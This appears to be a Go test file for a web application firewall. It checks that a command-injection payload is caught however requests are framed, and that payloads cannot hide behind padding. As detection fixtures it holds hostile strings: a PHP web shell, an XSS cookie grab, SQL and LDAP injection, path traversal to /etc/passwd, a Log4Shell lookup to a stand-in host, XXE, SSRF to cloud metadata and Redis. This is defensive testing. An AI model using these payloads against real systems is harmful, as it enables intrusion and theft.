// Copyright (c) 2026 Gembit Soultan Shirazi <gembit.soultan@gmail.com>. All rights reserved.

package gwaf_test

import (
	"strings"
	"testing"
)

// Parser-discrepancy corpus: every place gwaf could commit to one reading.
//
// # Why this file exists separately from the evasion corpus
//
// The evasion corpus varies the *payload*. This one holds the payload fixed and
// varies how the request is framed, because that is the axis the corpus cannot
// see. Two bugs found in this repository were invisible to a corpus of hundreds
// of attack payloads and took one afternoon of framing probes:
//
//   - ";whoami" in a query string, because pairs were split on ';' as well as
//     '&' and the value therefore never existed. Blocked in a form body, in a
//     JSON body, and percent-encoded — only the rawest spelling got through.
//   - A multipart body labelled application/x-www-form-urlencoded, which the
//     WAFFLED survey found over 90% of live sites accept as multipart.
//
// Both are the CVE-2026-21876 shape, which CLAUDE.md §2 names as the invariant
// the whole project is built on: "Never decode to a single 'the' form and match
// once." The invariant was written about decoding, and framing is the same
// question one layer up — deciding what the values *are*, not what they decode
// to.
//
// # The rule for adding to this file
//
// One payload, held constant, framed every way a backend might read it. If a
// framing is one an origin plausibly honours, gwaf must detect under it. A new
// framing goes in here before the fix, so the miss is on record.
//
// The payload is a command injection because shelli scores it unambiguously —
// 5 against a threshold of 5 — which makes a miss a framing failure rather than
// a detection one. That separation is the point: this file must never fail
// because a detector got weaker.
const (
	discrepancyPayload  = ";whoami"
	discrepancyEncoded  = "%3Bwhoami"
	discrepancyBoundary = "----WebKitFormBoundaryAbc123"
)

// framedMultipart frames the payload as a multipart document.
func framedMultipart(boundary, name, value string) string {
	return "--" + boundary + "\r\n" +
		"Content-Disposition: form-data; name=\"" + name + "\"\r\n\r\n" +
		value + "\r\n" +
		"--" + boundary + "--\r\n"
}

// TestFramingDiscrepancies holds the payload fixed and varies the framing.
func TestFramingDiscrepancies(t *testing.T) {
	w := newWAF(t)

	for _, tc := range []struct {
		name    string
		method  string
		target  string
		ctype   string
		body    string
		why     string
		headers [][2]string
	}{
		// ---- query-string separators ---------------------------------------
		{
			name: "query, raw semicolon", method: "GET",
			target: "/run?cmd=" + discrepancyPayload,
			why:    "Go and PHP both read ';' as data, not as a separator",
		},
		{
			name: "query, encoded semicolon", method: "GET",
			target: "/run?cmd=" + discrepancyEncoded,
			why:    "the same value, spelled the way every scanner spells it",
		},
		{
			name: "query, payload after an ampersand pair", method: "GET",
			target: "/run?page=1&cmd=" + discrepancyPayload,
			why:    "position in the query must not matter",
		},
		{
			name: "query, duplicate name with the payload last", method: "GET",
			target: "/run?cmd=ok&cmd=" + discrepancyEncoded,
			why:    "last-wins parsers (PHP, Go) read the second value",
		},
		{
			name: "query, duplicate name with the payload first", method: "GET",
			target: "/run?cmd=" + discrepancyEncoded + "&cmd=ok",
			why:    "first-wins parsers (ASP, some frameworks) read the first",
		},
		{
			name: "query, PHP array brace", method: "GET",
			target: "/run?cmd[]=" + discrepancyEncoded,
			why:    "PHP delivers this as an array whose element is the payload",
		},

		// ---- content-type against body shape --------------------------------
		{
			name: "multipart body labelled urlencoded", method: "POST", target: "/run",
			ctype: "application/x-www-form-urlencoded",
			body:  framedMultipart(discrepancyBoundary, "cmd", discrepancyPayload),
			why:   "WAFFLED: >90% of sites accept the two interchangeably",
		},
		{
			name: "multipart body labelled json", method: "POST", target: "/run",
			ctype: "application/json",
			body:  framedMultipart(discrepancyBoundary, "cmd", discrepancyPayload),
			why:   "the label is attacker-controlled whatever it says",
		},
		{
			name: "multipart body with no content-type at all", method: "POST", target: "/run",
			body: framedMultipart(discrepancyBoundary, "cmd", discrepancyPayload),
			why:  "absence is not a promise the body is unstructured",
		},
		{
			name: "multipart declared, boundary only in the body", method: "POST", target: "/run",
			ctype: "multipart/form-data",
			body:  framedMultipart(discrepancyBoundary, "cmd", discrepancyPayload),
			why:   "a missing boundary parameter must not lose the parts",
		},
		{
			name: "json body labelled urlencoded", method: "POST", target: "/run",
			ctype: "application/x-www-form-urlencoded",
			body:  `{"cmd":"` + discrepancyPayload + `"}`,
			why:   "json.Decode never reads the header",
		},
		{
			name: "json body labelled text/plain", method: "POST", target: "/run",
			ctype: "text/plain",
			body:  `{"cmd":"` + discrepancyPayload + `"}`,
			why:   "Express '*/*' and Flask force=True ignore the type",
		},
		{
			name: "form body labelled json", method: "POST", target: "/run",
			ctype: "application/json",
			body:  "cmd=" + discrepancyEncoded,
			why:   "a lenient form parser still reads the pair",
		},
		{
			name: "form body with no content-type", method: "POST", target: "/run",
			body: "cmd=" + discrepancyEncoded,
			why:  "the default for a form post is a form",
		},

		// ---- charset and casing on the type itself --------------------------
		{
			name: "type in mixed case with parameters", method: "POST", target: "/run",
			ctype: "Application/X-WWW-Form-UrlEncoded; charset=UTF-8",
			body:  "cmd=" + discrepancyEncoded,
			why:   "media types are case-insensitive per RFC 9110",
		},
		{
			name: "multipart type in mixed case", method: "POST", target: "/run",
			ctype: "MULTIPART/FORM-DATA; BOUNDARY=" + discrepancyBoundary,
			body:  framedMultipart(discrepancyBoundary, "cmd", discrepancyPayload),
			why:   "so is the boundary parameter name",
		},
		{
			name: "quoted boundary", method: "POST", target: "/run",
			ctype: `multipart/form-data; boundary="` + discrepancyBoundary + `"`,
			body:  framedMultipart(discrepancyBoundary, "cmd", discrepancyPayload),
			why:   "RFC 2045 permits the quoted form",
		},
	} {
		t.Run(tc.name, func(t *testing.T) {
			tx := w.NewTransaction()
			defer tx.Close()

			method := tc.method
			if method == "" {
				method = "GET"
			}
			target := tc.target
			if target == "" {
				target = "/run"
			}
			tx.SetRequestLine(method, target, "HTTP/1.1")
			tx.SetRemoteAddr("192.0.2.1")
			if tc.ctype != "" {
				tx.AddRequestHeader("Content-Type", tc.ctype)
			}
			for _, h := range tc.headers {
				tx.AddRequestHeader(h[0], h[1])
			}
			if d := tx.ProcessRequestHeaders(); d.Blocked() {
				return
			}
			if tc.body != "" {
				tx.SetRequestBody([]byte(tc.body))
			}
			if d := tx.ProcessRequestBody(); d.Blocked() {
				return
			}
			t.Errorf("not detected under this framing.\n  why it matters: %s\n"+
				"  the payload is the same one blocked in every other framing, so "+
				"this is a parsing discrepancy rather than a detection gap", tc.why)
		})
	}
}

// TestFramingDoesNotInventFindings is the other half.
//
// Evaluating a body under more than one reading can only add findings, so each
// additional reading is a false-positive risk taken deliberately. A sniff that
// fires on a body no origin would parse that way is pure cost, and worse, it is
// cost that looks like protection.
func TestFramingDoesNotInventFindings(t *testing.T) {
	w := newWAF(t)

	for _, tc := range []struct {
		name  string
		ctype string
		body  string
	}{
		// Bodies that open with "--" and are not multipart. None carries a part
		// header, which is the evidence SniffMultipart requires.
		{name: "unified diff", ctype: "text/plain",
			body: "--- a/main.go\n+++ b/main.go\n@@ -1 +1 @@\n-old\n+new\n"},
		{name: "pgp signature", ctype: "text/plain",
			body: "-----BEGIN PGP SIGNATURE-----\nabc\n-----END PGP SIGNATURE-----\n"},
		{name: "cli transcript", ctype: "text/plain",
			body: "--verbose --output=file.txt --retries=3"},
		{name: "yaml document marker", ctype: "text/plain",
			body: "---\nname: test\nvalue: 1\n"},
		{name: "sql comment", ctype: "text/plain",
			body: "-- this column stores the display name\nSELECT 1"},
		// Ordinary structured bodies must not be re-read as something else.
		{name: "plain json", ctype: "application/json",
			body: `{"name":"Alice","note":"uses -- for comments"}`},
		{name: "plain form", ctype: "application/x-www-form-urlencoded",
			body: "name=Alice&note=hello"},
		// A legitimate multipart upload whose content merely mentions a boundary.
		{name: "genuine upload", ctype: "multipart/form-data; boundary=" + discrepancyBoundary,
			body: framedMultipart(discrepancyBoundary, "note", "the boundary is --B here")},
	} {
		t.Run(tc.name, func(t *testing.T) {
			tx := w.NewTransaction()
			defer tx.Close()
			tx.SetRequestLine("POST", "/notes", "HTTP/1.1")
			tx.SetRemoteAddr("192.0.2.1")
			tx.AddRequestHeader("Content-Type", tc.ctype)
			if d := tx.ProcessRequestHeaders(); d.Blocked() {
				t.Fatalf("FALSE POSITIVE at header phase: rule=%d msg=%q", d.RuleID(), d.Message())
			}
			tx.SetRequestBody([]byte(tc.body))
			if d := tx.ProcessRequestBody(); d.Blocked() {
				t.Errorf("FALSE POSITIVE: rule=%d msg=%q\n  body=%q",
					d.RuleID(), d.Message(), tc.body)
			}
		})
	}
}

// TestSniffedMultipartIsBounded checks that the extra reading cannot be turned
// into work.
//
// A sniff that scans an entire body looking for evidence is a lever: an
// attacker sends a megabyte beginning with "--" and no part header, and pays
// nothing to make the firewall read all of it. The scan is capped, and this
// asserts the cap holds by giving it exactly that request.
func TestSniffedMultipartIsBounded(t *testing.T) {
	w := newWAF(t)

	var b strings.Builder
	b.WriteString("--" + discrepancyBoundary + "\r\n")
	for b.Len() < 512<<10 {
		b.WriteString("padding padding padding\r\n")
	}
	// The part header appears far past the cap, so a bounded sniff must decline.
	b.WriteString("Content-Disposition: form-data; name=\"cmd\"\r\n\r\n")
	b.WriteString(discrepancyPayload + "\r\n--" + discrepancyBoundary + "--\r\n")

	tx := w.NewTransaction()
	defer tx.Close()
	tx.SetRequestLine("POST", "/run", "HTTP/1.1")
	tx.SetRemoteAddr("192.0.2.1")
	tx.AddRequestHeader("Content-Type", "application/x-www-form-urlencoded")
	tx.ProcessRequestHeaders()
	tx.SetRequestBody([]byte(b.String()))

	// The payload is still in the body, so the raw-body reading must still find
	// it. What must not happen is the sniff scanning half a megabyte to decide.
	if d := tx.ProcessRequestBody(); !d.Blocked() {
		t.Error("payload past the sniff cap was not caught by any reading; " +
			"the fallback to raw-body inspection is what makes a bounded sniff safe")
	}
}

// TestPaddingPositionDoesNotHide is the systemic version of the bypass.
//
// Every semantic detector bounded its work with a constant named maxScan and
// applied it by truncating: `src = src[:maxScan]`. The reasoning beside each one
// is sound — signals are local to one command, one tag, one header — but it
// justifies a bounded *window*, not a bounded *prefix*. The payload never needed
// to be longer than the bound. It only needed to sit past it.
//
// Measured before the fix, with the payload after N bytes of ordinary text:
//
//	phpi, javaser, ldapi   8 KiB bound   missed at 16 KiB
//	shelli, xss, ssti     64 KiB bound   missed at 128 KiB
//
// Six of seven classes, each at exactly its own constant, and sqli — the one
// detector with no such constant — unaffected. The transaction layer had
// already identified this pattern and refused it: noteOversize's comment reads
// "Inspecting the first 64 KiB of a value and reporting the request as clean is
// a bypass with a padding step." The detectors were doing it one level down.
//
// The padding here is deliberately dull. It must not itself be suspicious, or
// the test would pass because the filler was blocked rather than because the
// payload was found.
func TestPaddingPositionDoesNotHide(t *testing.T) {
	w := newWAF(t)

	payloads := map[string]string{
		"shell":       ";whoami",
		"php":         "<?php system($_GET['c']); ?>",
		"java":        "rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcA",
		"template":    "{{7*7}}{{config.items()}}",
		"xss":         "<script>alert(document.cookie)</script>",
		"sql":         "1' UNION SELECT password FROM users--",
		"ldap":        "*)(uid=*))(|(uid=*",
		"nodejs":      "require('child_process').execSync('id')",
		"traversal":   "../../../../etc/passwd",
		"log4shell":   "${jndi:ldap://evil.tld/a}",
		"xxe":         `<!ENTITY x SYSTEM "file:///etc/passwd">`,
		"prototype":   `{"__proto__":{"isAdmin":true}}`,
		"cloudmeta":   "http://169.254.169.254/latest/meta-data/",
		"protoscheme": "gopher://10.0.0.5:6379/_SET%20x%20y",
	}

	// Padding depths that straddle every maxScan in the tree: 8 KiB, 64 KiB,
	// 128 KiB, and 512 KiB (graphql's bound).
	for _, pad := range []int{0, 2 << 10, 16 << 10, 96 << 10, 130 << 10, 600 << 10} {
		for name, payload := range payloads {
			t.Run(name+"/pad"+itoaKiB(pad), func(t *testing.T) {
				var b strings.Builder
				b.Grow(pad + len(payload) + 64)
				for b.Len() < pad {
					b.WriteString("the quick brown fox jumps over the lazy dog\n")
				}
				b.WriteString(payload)

				tx := w.NewTransaction()
				defer tx.Close()
				tx.SetRequestLine("POST", "/notes", "HTTP/1.1")
				tx.SetRemoteAddr("192.0.2.1")
				tx.AddRequestHeader("Content-Type", "text/plain")
				if d := tx.ProcessRequestHeaders(); d.Blocked() {
					return
				}
				tx.SetRequestBody([]byte(b.String()))
				if d := tx.ProcessRequestBody(); !d.Blocked() {
					t.Errorf("payload hidden behind %d bytes of padding.\n"+
						"  the same payload at offset 0 is detected, so this is a "+
						"scan bound applied as a prefix rather than as a window",
						pad)
				}
			})
		}
	}
}

// itoaKiB renders a byte count as a subtest name.
func itoaKiB(n int) string {
	if n == 0 {
		return "0"
	}
	kib := n >> 10
	var out []byte
	for kib > 0 {
		out = append([]byte{byte('0' + kib%10)}, out...)
		kib /= 10
	}
	return string(out) + "K"
}
